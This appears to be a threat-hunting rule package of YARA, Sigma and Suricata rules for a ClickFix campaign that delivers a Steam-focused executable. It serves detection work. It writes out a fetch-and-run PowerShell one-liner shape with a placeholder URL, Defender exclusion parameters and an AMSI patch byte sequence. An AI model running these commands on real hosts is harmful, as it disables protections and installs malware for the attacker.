---
title: "Detection Rules: newdouble ClickFix fake-verification chain to a Steam-focused executable"
date: '2026-09-28'
layout: post
permalink: /hunting-detections/newdouble-clickfix-detections/
hide: true
---

**Campaign:** Newdouble-ClickFix-202.71.14.31
**Date:** 2026-09-28
**Author:** The Hunters Ledger
**License:** CC BY 4.0
**Reference:** https://the-hunters-ledger.com/reports/newdouble-clickfix/

---

## Detection Coverage Summary

| Rule Type | Detection | Hunting | MITRE Techniques Covered | Atomics → feed |
|---|---|---|---|---|
| YARA | 0 | 3 | T1185, T1041 | 0 |
| Sigma | 0 | 6 | T1059.001, T1204.004, T1685, T1557, T1553.004, T1185 | 1 |
| Suricata | 0 | 5 | T1105, T1204.004, T1041 | 0 |

> **Detection vs Hunting:** *Detection rules* are high-fidelity and evasion-resilient, safe to alert on. *Hunting rules* are broader, for scoping and threat-hunting; expect to review the hits. **All fourteen rules in this package are Hunting.** A rule is Detection only when a retained clean-corpus, baseline or prevalence result shows it stays quiet on ordinary activity, and none of these rules has one yet, so none is offered for alerting.

The chain starts on a fake verification page that puts a PowerShell one-liner on the clipboard and asks the visitor to paste it into the Windows Run dialog. That command downloads a script, which exempts PowerShell and executables from Microsoft Defender, copies itself under the roaming profile, and downloads a Steam-focused executable. The hashes and dropped file paths are in the IOC feed for this campaign (`newdouble-clickfix-iocs.json`), not in rules, because each one stops matching the moment the operator changes it. The delivery IP, the lure domains and the two delivery URLs are in the same feed as historical hunt entries, not blocklist entries, because their current liveness and ownership are NOT CHECKED and a reassigned address would put an unrelated owner on a blocklist.

---

## YARA Rules

All three rules key on strings and structure that are already in the executable and its embedded DLL, and none needs the sample to be running. They are Hunting rules for file scanning, memory scanning and retro-hunts over collected executables. The carved DLL hash is kept in the IOC feed as a memory-scan seed, not as a blocklist entry.

### Hunting Rules

#### Newdouble_ClickFix_SteamCDP_Loader_Strings

**Tier:** Hunting
**Robustness:** 2
**Tier reason:** Hunting because the benign corpus checked (58,000 Windows files, no Steam install among them) cannot test the most likely benign source of these strings, so the false-positive profile is only partly characterized. See Coverage Gaps for the results.
**ATT&CK Coverage:** T1185 (Browser Session Hijacking), T1041 (Exfiltration Over C2 Channel)
**ATT&CK Note:** Both techniques come from strings and located functions in the executable, not from an observed run. The executable's path from local Steam data to the panel upload was not traced end to end, so T1041 is a capability mapping.
**Confidence:** HIGH
**False Positives:** None known. The rule requires a PE file and the log banner, or the Steam mutex-style name plus one panel string, or three of the panel and marker strings together. A document or analyst note that quotes these strings is not a PE and does not match.
**Blind Spots:** Misses a rebuild that changes the string constants, and misses a copy whose strings are encoded or encrypted at rest. A scan of a running process only sees them once the process has decoded them.
**Validation:** Scan the executable (SHA-256 `1366b8ca...`) and confirm a hit. Scan an ordinary Steam installation and Windows system directory and confirm no hit.
**Deployment:** File scan, memory scan and retro-hunt over collected executables; review hits, do not alert or block on them.

```yara
rule Newdouble_ClickFix_SteamCDP_Loader_Strings {
   meta:
      description = "Detects the Steam-focused x64 executable delivered by the newdouble ClickFix chain by its mutex-style name, its log banner, its panel upload path and header name, and the Steam CEF debugging marker file name"
      license = "CC BY 4.0 - https://creativecommons.org/licenses/by/4.0/"
      author = "The Hunters Ledger"
      reference = "https://the-hunters-ledger.com/hunting-detections/newdouble-clickfix-detections/"
      date = "2026-09-28"
      hash1 = "1366b8ca7f315142ba9989241402758cf2a86e5568a28da0942e1810fe12c324"
      hash2 = "f9d075fc57b6b27a6066734a9a9ba25d666ba9db"
      hash3 = "405186a1740ede3e8c56bbf81c043e7e"
      family = "newdouble ClickFix Steam-focused loader chain"
      id = "bffecf94-dc62-549b-9111-8f6add7c93b9"
   strings:
      $x1 = "Global\\SteamCDP" ascii wide
      $x2 = "=== BerserkCDP started ===" ascii wide
      $s1 = "X-Vac-Secret" ascii wide
      $s2 = "/api/mafile/import" ascii wide
      $s3 = ".cef-enable-remote-debugging" ascii wide
   condition:
      uint16(0) == 0x5A4D and
      uint32(uint32(0x3C)) == 0x00004550 and
      filesize < 8MB and
      ( $x2 or ( $x1 and 1 of ($s*) ) or 3 of ($s*) )
}
```

#### Newdouble_ClickFix_Berserk_Embedded_DLL_PDB_Hooks

**Tier:** Hunting
**Robustness:** 2
**Tier reason:** Hunting because the benign corpus checked (58,000 Windows files, no Steam install among them) cannot test the most likely benign source of these strings, so the false-positive profile is only partly characterized. See Coverage Gaps for the results.
**ATT&CK Coverage:** None
**ATT&CK Note:** The DLL is an in-game overlay and hook set for Counter-Strike 2. I am not mapping a technique to it because its hook bodies were not read and its purposes rest on the hook names.
**Confidence:** HIGH
**False Positives:** None known. The build path and the four hook names are specific to this builder, and the rule needs the path or three of the six strings. A legitimate game overlay would not carry the `berserk_gamebaker` build path.
**Blind Spots:** Misses a rebuild with a stripped debug directory and renamed hooks. Matches the outer executable as well as the carved DLL, because the DLL is stored unencoded inside it; a DLL that is stored encoded is not seen until it is decoded in memory.
**Validation:** Scan the carved DLL (SHA-256 `f6afe770...`) or the outer executable and confirm a hit. Scan a game overlay or a Dear ImGui sample application and confirm no hit.
**Deployment:** File scan and memory scan (the DLL is a memory-scan seed); review hits, do not alert or block on them.

```yara
rule Newdouble_ClickFix_Berserk_Embedded_DLL_PDB_Hooks {
   meta:
      description = "Detects the Counter-Strike 2 overlay DLL carried inside the newdouble ClickFix executable, by its build PDB path together with its four hook-name strings and the matchmaking-penalty localisation token"
      license = "CC BY 4.0 - https://creativecommons.org/licenses/by/4.0/"
      author = "The Hunters Ledger"
      reference = "https://the-hunters-ledger.com/hunting-detections/newdouble-clickfix-detections/"
      date = "2026-09-28"
      hash1 = "f6afe770a78d3655c367819b0c5e8afb623cf56b9922c179efbc89fea1a9ea86"
      hash2 = "17602aa32d21a7bba16e1c657b4a818463fc560a"
      hash3 = "83cb3b733cad23c702777baa42efaca3"
      family = "newdouble ClickFix Steam-focused loader chain"
      id = "c94f292f-ef23-5d7d-aee8-79aabc82bc7f"
   strings:
      $x1 = "D:\\PROJECTVS\\berserk_gamebaker\\x64\\Release\\berserkv2.pdb" ascii wide
      $s1 = "hkantitamper" ascii wide
      $s2 = "hkIsVacBanned" ascii wide
      $s3 = "hkMMUpdate" ascii wide
      $s4 = "hkStartMatchmaking" ascii wide
      $s5 = "#SFUI_QMM_ERROR_1_PenaltySeconds" ascii wide
   condition:
      uint16(0) == 0x5A4D and
      uint32(uint32(0x3C)) == 0x00004550 and
      filesize < 8MB and
      ( $x1 or 3 of ($s*) )
}
```

#### Newdouble_ClickFix_Berserk_Loader_Imphash_Or_Export

**Tier:** Hunting
**Robustness:** 1
**ATT&CK Coverage:** None
**Confidence:** MODERATE
**False Positives:** Another executable built with the same toolchain and an identical import list would share the import hash, and an unrelated PE could name its export directory `BERSERK.exe`. Review hits by file size and strings before acting.
**Blind Spots:** The import hash changes on any relink that alters the import list, and the export-name branch needs a builder that keeps the same module name in the export directory. A string `BERSERK.exe` elsewhere in a file does not match, by design. Neither is a durable anchor, which is why this is a scoping rule and not an alert.
**Validation:** Scan the executable (SHA-256 `1366b8ca...`) and confirm a hit. Scan Windows system and program directories and confirm no hit.
**Deployment:** Retro-hunt over stored executables to find rebuilds and near-copies; do not alert or block on it.

```yara
import "pe"

rule Newdouble_ClickFix_Berserk_Loader_Imphash_Or_Export {
   meta:
      description = "Hunting rule for the newdouble ClickFix executable and rebuilds that keep its import table or the module name BERSERK.exe in the PE export directory"
      license = "CC BY 4.0 - https://creativecommons.org/licenses/by/4.0/"
      author = "The Hunters Ledger"
      reference = "https://the-hunters-ledger.com/hunting-detections/newdouble-clickfix-detections/"
      date = "2026-09-28"
      hash1 = "1366b8ca7f315142ba9989241402758cf2a86e5568a28da0942e1810fe12c324"
      hash2 = "f9d075fc57b6b27a6066734a9a9ba25d666ba9db"
      hash3 = "405186a1740ede3e8c56bbf81c043e7e"
      family = "newdouble ClickFix Steam-focused loader chain"
      id = "d8deb920-6a28-5fa0-9d91-60ba1b54902e"
   condition:
      uint16(0) == 0x5A4D and
      uint32(uint32(0x3C)) == 0x00004550 and
      filesize < 8MB and
      ( pe.imphash() == "87e8479ef75eb55bf7a09ca6b8a60c49" or
        pe.dll_name == "BERSERK.exe" )
}
```

---

## Sigma Rules

All six rules are Hunting and use `status: experimental`. Each carries an `stp.N` tag that records its durability score (`stp.3` is Robustness 2, `stp.4` is Robustness 3, `stp.2` is Robustness 1).

### Hunting Rules

#### ClickFix PowerShell Stager Pasted Into Run Dialog Downloading a Script Then Running It

**Tier:** Hunting
**Robustness:** 2
**Tier reason:** Hunting because no retained baseline replay or prevalence result is cited for this rule, so its false-positive profile is uncharacterized and a benign administrator script can match it.
**ATT&CK Coverage:** T1059.001 (PowerShell), T1204.004 (Malicious Copy and Paste)
**ATT&CK Note:** An existing upstream rule covers the Run dialog history on registry telemetry; this rule covers the same paste on process-creation telemetry and keys on the download-save-run shape of the command, not on the operator's URL.
**Confidence:** MODERATE
**False Positives:** An administrator pasting a download-and-run one-liner into the Run dialog; internal onboarding instructions that tell users to paste a script bootstrap command.
**Blind Spots:** Misses a variant that splits the download and the run into separate commands, one that uses `curl.exe` or `Start-BitsTransfer` in place of `iwr`, and any delivery that does not go through the Run dialog (a terminal window opened by the victim has a different parent process).
**Validation:** Paste the observed one-liner shape (`powershell -ep bypass -c "IWR <url> -OutFile $env:TEMP\x.ps1 -UseBasicParsing; powershell -ep bypass -File $env:TEMP\x.ps1"`) into the Run dialog on a test host and confirm the rule fires on the outer process. Running the same text from an interactive PowerShell prompt must not fire it, because the parent is not `explorer.exe`.
**Deployment:** Threat hunting over process-creation telemetry with the command line; not for alerting.

```yaml
title: ClickFix PowerShell Stager Pasted Into Run Dialog Downloading a Script Then Running It
id: a952ed07-5481-4776-aa2e-22187bb98c4a
status: experimental
description: >-
    Detects a PowerShell command line launched by explorer.exe that downloads a
    script with Invoke-WebRequest, saves it with -OutFile as a .ps1 file, and
    runs it with -File in the same command. This is the shape of the command
    a ClickFix fake-verification page places on the clipboard for the victim to
    paste into the Windows Run dialog.
references:
    - https://the-hunters-ledger.com/hunting-detections/newdouble-clickfix-detections/
author: The Hunters Ledger
date: 2026-09-28
tags:
    - attack.execution
    - attack.t1059.001
    - attack.t1204.004
    - detection.emerging-threats
    - stp.3
logsource:
    category: process_creation
    product: windows
    definition: 'Requires process creation logging that populates CommandLine and ParentImage, for example Sysmon EID 1 or Security EID 4688 with command line auditing enabled.'
detection:
    selection_parent:
        ParentImage|endswith: '\explorer.exe'
    selection_image:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
    selection_download:
        CommandLine|contains:
            - 'iwr '
            - 'Invoke-WebRequest'
    selection_flow:
        CommandLine|contains|all:
            - '-OutFile'
            - '.ps1'
            - '-File'
    condition: all of selection_*
falsepositives:
    - An administrator pasting a download-and-run one-liner into the Run dialog
    - Internal onboarding instructions that tell users to paste a script bootstrap command
level: medium
```

#### Defender Path, Process and Extension Exclusions Set in One PowerShell Script Block

**Tier:** Hunting
**Robustness:** 2
**Tier reason:** Hunting because no retained baseline replay or prevalence result is cited for this rule, so its false-positive profile is uncharacterized and a benign administrator script can match it.
**ATT&CK Coverage:** T1685 (Disable or Modify Tools)
**ATT&CK Note:** ATT&CK v19 revoked T1562.001 in favor of this top-level technique under the Defense Impairment tactic, so the rule tags `attack.defense-impairment` and `attack.t1685`.
**Confidence:** HIGH
**False Positives:** Deployment or hardening scripts that set several Defender exclusion types in one call; software installers that register their own exclusions during setup.
**Blind Spots:** Needs script block logging. Misses exclusions set across separate calls, through Group Policy or the registry directly, or with abbreviated or splatted parameter names, which PowerShell accepts.
**Validation:** On a test host with script block logging enabled, run `Set-MpPreference` with `-ExclusionPath`, `-ExclusionProcess` and `-ExclusionExtension` in one call and confirm the rule fires. A call that sets only one exclusion type must not fire it.
**Deployment:** Threat hunting over PowerShell script block events (Microsoft-Windows-PowerShell/Operational, event 4104); not for alerting.

Existing upstream rules already flag single Defender exclusions at medium severity. This rule is kept as a narrower variant: all three exclusion classes in one block is the observed first-stage pattern, and I expect it to be uncommon in legitimate administration, but I have no measurement of that.

```yaml
title: Defender Path, Process and Extension Exclusions Set in One PowerShell Script Block
id: 637cc940-8288-4050-942b-937f287507ab
status: experimental
description: >-
    Detects a single PowerShell script block that calls Set-MpPreference or
    Add-MpPreference with path, process and extension exclusion parameters
    together. Setting all three exclusion classes in one call is the pattern used
    by a ClickFix first-stage script that exempts powershell.exe, executables and
    .ps1 files from Microsoft Defender before it downloads its next stage.
references:
    - https://the-hunters-ledger.com/hunting-detections/newdouble-clickfix-detections/
    - https://learn.microsoft.com/en-us/powershell/module/defender/set-mppreference
author: The Hunters Ledger
date: 2026-09-28
tags:
    - attack.defense-impairment
    - attack.t1685
    - detection.emerging-threats
    - stp.3
logsource:
    category: ps_script
    product: windows
    definition: 'Requires PowerShell Script Block Logging (Microsoft-Windows-PowerShell/Operational EID 4104) to be enabled.'
detection:
    selection_cmdlet:
        ScriptBlockText|contains:
            - 'Set-MpPreference'
            - 'Add-MpPreference'
    selection_exclusions:
        ScriptBlockText|contains|all:
            - '-ExclusionPath'
            - '-ExclusionProcess'
            - '-ExclusionExtension'
    condition: all of selection_*
falsepositives:
    - Deployment or hardening scripts that set several Defender exclusion types in one call
    - Software installers that register their own exclusions during setup
level: medium
```

#### PowerShell Writing a Script Into a Roaming Profile Subfolder

**Tier:** Hunting
**Robustness:** 1
**ATT&CK Coverage:** T1059.001 (PowerShell)
**Confidence:** LOW
**False Positives:** PowerShell modules or profile scripts saved to the roaming profile by administrators; developer tooling that writes helper scripts under the roaming profile.
**Blind Spots:** Misses a script copied by a different process, and any write outside the roaming profile.
**Validation:** Run `Copy-Item` from a PowerShell prompt into `%APPDATA%\SomeFolder\test.ps1` and confirm the rule fires.
**Deployment:** Threat hunting over file-creation telemetry; not for alerting.

The first-stage script copies itself to `%APPDATA%\MyApp\y.ps1` and relaunches from that copy. A rule keyed on that exact path fails as soon as the operator changes the folder name, so the exact path is in the IOC feed and this rule keys on the write pattern instead.

```yaml
title: PowerShell Writing a Script Into a Roaming Profile Subfolder
id: 00e6aae1-d69f-473d-a5c9-c3520d170a31
status: experimental
description: >-
    Detects powershell.exe creating a .ps1 file in a subfolder of the roaming
    AppData directory. A ClickFix first-stage script copies itself to
    %APPDATA%\MyApp\y.ps1 and relaunches from that copy. The folder name is
    attacker-chosen, so the rule keys on the write pattern rather than the name.
    This is a hunting lead, not an alert.
references:
    - https://the-hunters-ledger.com/hunting-detections/newdouble-clickfix-detections/
author: The Hunters Ledger
date: 2026-09-28
tags:
    - attack.execution
    - attack.t1059.001
    - detection.emerging-threats
    - stp.2
logsource:
    category: file_event
    product: windows
    definition: 'Requires Sysmon EID 11 (FileCreate) logging with Image populated.'
detection:
    selection:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
        TargetFilename|contains: '\AppData\Roaming\'
        TargetFilename|endswith: '.ps1'
    condition: selection
falsepositives:
    - PowerShell modules or profile scripts saved to the roaming profile by administrators
    - Developer tooling that writes helper scripts under the roaming profile
level: low
```

#### Per-User Proxy or PAC Setting Changed by a Process Running From AppData

**Tier:** Hunting
**Robustness:** 1
**ATT&CK Coverage:** T1557 (Adversary-in-the-Middle)
**ATT&CK Note:** The executable's proxy or PAC change is a candidate capability from static analysis. The values it writes were not recovered, so the rule keys on the writer and the setting, not the data.
**Confidence:** LOW
**False Positives:** VPN, proxy and filtering clients installed under the user profile that manage the system proxy; developer proxy tools started from a user profile folder.
**Blind Spots:** Needs Sysmon registry monitoring on the Internet Settings key. Misses a writer that runs from outside AppData and a change made through a system API that does not pass through a monitored registry event.
**Validation:** Copy a test executable into `%APPDATA%` and have it set `ProxyEnable` under the per-user Internet Settings key; confirm the rule fires. The same change made by `rundll32.exe` from System32 must not fire it.
**Deployment:** Threat hunting over registry-set telemetry; not for alerting.

```yaml
title: Per-User Proxy or PAC Setting Changed by a Process Running From AppData
id: a46ddda1-468c-4417-a38f-38ade5e69da6
status: experimental
description: >-
    Detects a process running from a user AppData folder writing the ProxyServer,
    ProxyEnable or AutoConfigURL value under the per-user Internet Settings key.
    A Steam-focused executable delivered by a ClickFix chain changes these values
    as part of a traffic-interception setup. The values it writes were not
    recovered, so the rule keys on the writer and the setting, not the data.
references:
    - https://the-hunters-ledger.com/hunting-detections/newdouble-clickfix-detections/
author: The Hunters Ledger
date: 2026-09-28
tags:
    - attack.credential-access
    - attack.collection
    - attack.t1557
    - detection.emerging-threats
    - stp.2
logsource:
    category: registry_set
    product: windows
    definition: 'Requires Sysmon EID 13 (RegistryEvent value set) with the Internet Settings key path included in the registry monitoring config.'
detection:
    selection:
        TargetObject|contains: '\Software\Microsoft\Windows\CurrentVersion\Internet Settings\'
        TargetObject|endswith:
            - '\ProxyServer'
            - '\ProxyEnable'
            - '\AutoConfigURL'
        Image|contains: '\AppData\'
    condition: selection
falsepositives:
    - VPN, proxy and filtering clients installed under the user profile that manage the system proxy
    - Developer proxy tools started from a user profile folder
level: medium
```

#### Root Certificate Added to the Machine Root Store by a Process Running From AppData

**Tier:** Hunting
**Robustness:** 1
**ATT&CK Coverage:** T1553.004 (Install Root Certificate)
**ATT&CK Note:** The certificate itself, its thumbprint and its source were not recovered, so the rule keys on the writer and the store location. The executable opens the machine `ROOT` store (its own error string reads `CertOpenStore LOCAL_MACHINE\ROOT failed`), so the rule matches the `HKLM` store only and does not match a certificate added to the current user's root store. The generic upstream rule for root-store additions already exists; this rule adds the AppData-writer anchor.
**Confidence:** LOW
**False Positives:** Local development tools that create and trust a local certificate authority from a user profile folder; per-user installers of filtering or inspection software.
**Blind Spots:** Needs Sysmon registry monitoring on the SystemCertificates key. Misses a certificate added by a system utility such as `certutil.exe`, where the writer is not in AppData, and a certificate added to the current user's root store, which is written under the user hive and is out of scope on purpose.
**Validation:** Run a test executable from `%APPDATA%` that adds a certificate to the machine (LOCAL_MACHINE) Root store and confirm the rule fires. A certificate added by Group Policy must not fire it, and neither must the same executable adding a certificate to the current user's Root store.
**Deployment:** Threat hunting over registry-set telemetry; not for alerting.

```yaml
title: Root Certificate Added to the Machine Root Store by a Process Running From AppData
id: ba366b18-496e-4ebe-8302-4bb4d305ee2a
status: experimental
description: >-
    Detects a process running from a user AppData folder writing a certificate
    blob under the machine (HKLM, LOCAL_MACHINE) Root certificate store. A certificate
    written to the current user's Root store does not match. A Steam-focused executable
    delivered by a ClickFix chain installs a root certificate as part of a
    traffic-interception setup. Legitimate root additions normally come from
    installers, group policy or management tooling, not from a binary in AppData.
references:
    - https://the-hunters-ledger.com/hunting-detections/newdouble-clickfix-detections/
author: The Hunters Ledger
date: 2026-09-28
tags:
    - attack.defense-impairment
    - attack.t1553.004
    - detection.emerging-threats
    - stp.2
logsource:
    category: registry_set
    product: windows
    definition: 'Requires Sysmon EID 13 (RegistryEvent value set) with the SystemCertificates key path included in the registry monitoring config.'
detection:
    selection:
        TargetObject|startswith: 'HKLM\SOFTWARE\Microsoft\SystemCertificates\Root\Certificates\'
        TargetObject|endswith: '\Blob'
        Image|contains: '\AppData\'
    condition: selection
falsepositives:
    - Local development tools that create and trust a local certificate authority from a user profile folder
    - Per-user installers of filtering or inspection software
level: medium
```

#### Steam CEF Remote Debugging Marker File Created

**Tier:** Hunting
**Robustness:** 3
**ATT&CK Coverage:** T1185 (Browser Session Hijacking)
**ATT&CK Note:** The executable carries this filename as a static string. Successful use of the Steam debugging port was not observed, so this is a candidate capability.
**Confidence:** MODERATE
**False Positives:** Steam interface modding and theming tools that enable browser debugging on purpose; developers debugging Steam overlay or store pages.
**Blind Spots:** Misses a driver that reaches the Steam interface without the marker file, and hosts where Steam is installed under a path the file-creation telemetry does not cover.
**Validation:** Create an empty `.cef-enable-remote-debugging` file in the Steam folder and confirm the rule fires. Ordinary Steam client updates must not create it.
**Deployment:** Threat hunting over file-creation telemetry, scoped to hosts where Steam is installed.

The filename is defined by Steam, so it cannot be renamed while the technique works. It is Hunting rather than Detection because modding tools create the same file on purpose.

```yaml
title: Steam CEF Remote Debugging Marker File Created
id: cdfa7e7b-3669-40ec-a423-a9f4e06bdb84
status: experimental
description: >-
    Detects creation of the .cef-enable-remote-debugging marker file, which tells
    the Steam client to expose its embedded browser debugging port. A Steam-focused
    executable delivered by a ClickFix chain carries this filename and uses the
    debugging port to drive the Steam interface. The filename is defined by Steam,
    so it cannot be renamed while the technique works, but Steam interface
    modding tools create it deliberately, so treat hits as leads.
references:
    - https://the-hunters-ledger.com/hunting-detections/newdouble-clickfix-detections/
author: The Hunters Ledger
date: 2026-09-28
tags:
    - attack.collection
    - attack.t1185
    - detection.emerging-threats
    - stp.4
logsource:
    category: file_event
    product: windows
    definition: 'Requires Sysmon EID 11 (FileCreate) logging with Image populated.'
detection:
    selection:
        TargetFilename|endswith: '\.cef-enable-remote-debugging'
    condition: selection
falsepositives:
    - Steam interface modding and theming tools that enable browser debugging on purpose
    - Developers debugging Steam overlay or store pages
level: medium
```

---

## Suricata Signatures

All five signatures are Hunting and use the local sids 9302101 to 9302105, which the feed generator remaps to its published block. The two delivery-path signatures and the two lure-domain signatures key on a single value the operator can change; the same indicators are in the IOC feed as historical hunt entries. The panel-import signature keys on a protocol path and header rather than an address, but it has never been run against traffic and its transport is unconfirmed, so it is Hunting as well.

### Hunting Rules

#### Panel Import POST With X-Vac-Secret Header

**Tier:** Hunting
**Robustness:** 2
**Tier reason:** Hunting because the signature has never been replayed against traffic, so neither a match nor a false-positive result exists for it.
**ATT&CK Coverage:** T1041 (Exfiltration Over C2 Channel)
**ATT&CK Note:** The endpoint and header are static strings in the executable. A successful upload was not observed, so the mapping is a candidate capability.
**Confidence:** MODERATE
**False Positives:** None known, and untested against live traffic. A third-party panel that implements the same import API and header would match.
**Blind Spots:** The transport scheme to the panel was not recovered. If it is HTTPS, this rule sees nothing without TLS inspection. The panel address was not recovered either, so the rule cannot be scoped to a destination.
**Validation:** Send a POST to `/api/mafile/import` with an `X-Vac-Secret` header through a sensor and confirm the alert. A POST to the same path without the header must not fire it.
**Deployment:** Egress HTTP inspection, or TLS-terminating proxy logs replayed through the engine; hunting only.

```
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"THL HUNT newdouble-ClickFix Panel Import POST With X-Vac-Secret Header (Steam Account Data Upload)"; flow:established,to_server; http.method; content:"POST"; http.uri; content:"/api/mafile/import"; startswith; http.header; content:"X-Vac-Secret|3a|"; nocase; threshold:type limit,track by_src,count 1,seconds 3600; reference:url,the-hunters-ledger.com/hunting-detections/newdouble-clickfix-detections/; classtype:trojan-activity; sid:9302105; rev:2; metadata:author The_Hunters_Ledger, date 2026-09-28;)
```

#### First-Stage Script Fetch (y.ps1 URI Path)

**Tier:** Hunting
**Robustness:** 1
**ATT&CK Coverage:** T1105 (Ingress Tool Transfer)
**Confidence:** MODERATE
**False Positives:** Any internal or third-party server that serves a script at `/y/y.ps1`.
**Blind Spots:** Misses HTTPS delivery and any change of path. The older template pages reference the same script name on other addresses, so this path may recur, but operator linkage across them is not established.
**Validation:** Request `http://<test host>/y/y.ps1` through the sensor and confirm the alert.
**Deployment:** Egress HTTP inspection; hunting only.

```
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"THL HUNT newdouble-ClickFix First-Stage Script Fetch (y.ps1 URI Path)"; flow:established,to_server; http.method; content:"GET"; http.uri; content:"/y/y.ps1"; endswith; threshold:type limit,track by_src,count 1,seconds 3600; reference:url,the-hunters-ledger.com/hunting-detections/newdouble-clickfix-detections/; classtype:trojan-activity; sid:9302101; rev:2; metadata:author The_Hunters_Ledger, date 2026-09-28;)
```

#### Second-Stage Executable Fetch (x.exe URI Path to Delivery Host)

**Tier:** Hunting
**Robustness:** 1
**ATT&CK Coverage:** T1105 (Ingress Tool Transfer)
**Confidence:** MODERATE
**False Positives:** None expected while the delivery address stays with this operator; if the address is reassigned, hits become unrelated traffic.
**Blind Spots:** Dies when the operator changes address. Kept as a standing signature for triage and pivoting only, and the same address and URL are in the IOC feed.
**Validation:** Request `/x/x.exe` from a test host standing in for the delivery address and confirm the alert.
**Deployment:** Egress HTTP inspection; hunting only.

```
alert http $HOME_NET any -> 202.71.14.31 any (msg:"THL HUNT newdouble-ClickFix Second-Stage Executable Fetch (x.exe URI Path to Delivery Host)"; flow:established,to_server; http.method; content:"GET"; http.uri; content:"/x/x.exe"; endswith; threshold:type limit,track by_src,count 1,seconds 3600; reference:url,the-hunters-ledger.com/hunting-detections/newdouble-clickfix-detections/; classtype:trojan-activity; sid:9302102; rev:2; metadata:author The_Hunters_Ledger, date 2026-09-28;)
```

#### Lure Domain DNS Query (Fake Verification Page)

**Tier:** Hunting
**Robustness:** 1
**ATT&CK Coverage:** T1204.004 (Malicious Copy and Paste)
**Confidence:** MODERATE
**False Positives:** None expected for the two observed domains; a lookalike registered by someone else would match the `newdouble` prefix and the `authentification.com` suffix.
**Blind Spots:** Dies when the operator registers a new lure domain. The older template pages use different domains and are not covered.
**Validation:** Resolve `newdoubleauthentification.com` from a test host and confirm the alert.
**Deployment:** DNS inspection or resolver logs replayed through the engine; hunting only.

```
alert dns $HOME_NET any -> any any (msg:"THL HUNT newdouble-ClickFix Lure Domain DNS Query (Fake Verification Page)"; dns.query; content:"newdouble"; nocase; content:"authentification.com"; nocase; distance:0; isdataat:!1,relative; threshold:type limit,track by_src,count 1,seconds 3600; reference:url,the-hunters-ledger.com/hunting-detections/newdouble-clickfix-detections/; classtype:trojan-activity; sid:9302103; rev:2; metadata:author The_Hunters_Ledger, date 2026-09-28;)
```

#### Lure Domain TLS SNI (Fake Verification Page)

**Tier:** Hunting
**Robustness:** 1
**ATT&CK Coverage:** T1204.004 (Malicious Copy and Paste)
**Confidence:** MODERATE
**False Positives:** Same as the DNS signature: a lookalike domain with the same prefix and suffix.
**Blind Spots:** Dies when the operator registers a new lure domain. Sees nothing when the client uses Encrypted Client Hello.
**Validation:** Open a TLS connection with SNI `newdoubleauthentification.com` through the sensor and confirm the alert.
**Deployment:** TLS inspection; hunting only.

```
alert tls $HOME_NET any -> $EXTERNAL_NET any (msg:"THL HUNT newdouble-ClickFix Lure Domain TLS SNI (Fake Verification Page)"; flow:established,to_server; tls.sni; content:"newdouble"; nocase; content:"authentification.com"; nocase; distance:0; isdataat:!1,relative; threshold:type limit,track by_src,count 1,seconds 3600; reference:url,the-hunters-ledger.com/hunting-detections/newdouble-clickfix-detections/; classtype:trojan-activity; sid:9302104; rev:2; metadata:author The_Hunters_Ledger, date 2026-09-28;)
```

---

## Coverage Gaps

Each item below is behavior or infrastructure the analysis touched that I did not turn into a rule, with the reason and what would change that.

**Not covered for lack of a recovered value**

- **Panel address, port and the `X-Vac-Secret` value.** The upload path and header name are in a Suricata rule and the executable YARA rule (both Hunting), but the panel host, port and secret value were not recovered, so no rule keys on the destination. A recovered panel address would go to the IOC feed and a Suricata destination rule.
- **Root certificate thumbprint and the source of its PKCS#12 bundle.** The root-store add is detected by the writing process and the store path only. A thumbprint would allow an exact registry rule and a certificate-chain hunt.
- **Proxy and PAC values.** The proxy setting rule keys on the writer and the setting name, not the data, because the values the executable writes were not recovered. That is why it is a Hunting rule.
- **Injection primitive.** The executable's route into the game or browser process was not established, so there is no injection rule.
- **AMSI patch.** The stager carries the byte sequence `B8 57 00 07 80 C3`, but the API names it patches are built from character literals and how the bytes are formatted in the script was not established. A rule on an unconfirmed string format would not fire, so I left it out.

**Deliberately cut**

- **Single-literal path rule for `%APPDATA%\MyApp\y.ps1` and `y.dat`.** With the one path removed the rule detects nothing, so it fails the durability gate as a Detection rule. I kept the behavior as a Hunting Sigma rule on a script written into a roaming-profile subfolder, and the two paths are in the IOC feed.
- **Correlation rule pairing the proxy change with the root-certificate add.** The SigmaHQ test suite has no correlation support, so the rule could not be validated to the standard the other rules meet. Both base rules stand alone.
- **Older template URLs at `93.183.93.9`, `212.113.98.10` and `185.209.30.61`.** Whether the same operator used them is INSUFFICIENT on current evidence, and VirusTotal held no record for either of the two older URLs I looked up (`212.113.98.10` and `185.209.30.61`), so reputation for them is NOT CHECKED. They are not in the rules or the feed.
- **`127.0.0.1:6968` and the local callback listener.** A loopback address is not a network indicator that a sensor can act on.

**Validation limits**

- **Suricata replay is NOT CHECKED.** No capture of the fetch or upload traffic was available, so the five signatures are syntax-validated only. The sid 9302105 transport is unconfirmed and is most likely TLS; if it is, the HTTP buffers will not see it and the rule needs a decrypting sensor.
- **Sigma positive-match testing is NOT CHECKED.** No telemetry from a run was available. No benign-log replay result is retained for any of the six rules, so none is cited, and that is why none is Detection tier.
- **Sigma telemetry assumptions.** The proxy, root-store and marker-file rules need Sysmon registry and file-create events for the paths named in each rule's `logsource.definition`; without them the rules do not fire.
- **Upstream coverage for the YARA and Suricata rules is NOT CHECKED.** No comparison against published rules was run for either language.
- **YARA scope.** The carved DLL was matched only through the outer executable. I did not scan for a copy stored XOR-encoded or compressed. The rules match strings the samples carry, so a rebuild that changes them evades the string rules. The Hunting rule's import hash and Rich-header atoms are also in the IOC feed.
- **YARA corpus and true-positive results.** All three rules compiled and matched the analyzed executable. A scan of 57,586 benign Windows files (24,217 under System32, 33,369 under Program Files) returned 0 hits, and 61,270 files in a separate administrator-tools folder returned 0 hits. The first two rules also matched hand-built fixtures carrying their strings and stayed silent on a fixture carrying only one string from each. The corpus held no Steam installation, so it cannot show whether Steam or Steam add-on software carries the loader strings; that untested case is why the first two rules stay Hunting. The third rule (import hash or export-directory module name) needs a real PE to self-test, so its only positive match is the analyzed executable itself, and it is NOT SELF-TESTED on a synthetic fixture.

**Static-only capability.** Every behavior above the network layer is drawn from static analysis of the executable and the ClickFix script. None of the endpoint rules has been confirmed against a live run.

---

## License

Detection rules are licensed under **Creative Commons Attribution 4.0 International (CC BY 4.0)**.
